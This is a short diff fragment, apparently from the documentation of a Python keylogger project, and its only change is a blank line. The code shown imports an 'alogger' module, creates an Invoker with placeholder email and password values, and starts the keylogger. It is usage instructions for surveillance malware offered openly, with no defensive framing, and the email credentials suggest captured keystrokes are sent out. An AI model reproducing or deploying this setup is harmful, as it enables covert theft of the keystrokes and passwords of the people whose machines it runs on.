@@ -28,6 +28,7 @@ alogger.py is all about code and keylogger is the file where we have to provide 
 import alogger
 
 keylogger = alogger.Invoker(100,"Email","Password") # Supply username and password overhere.
+
 keylogger.begin()
 
 
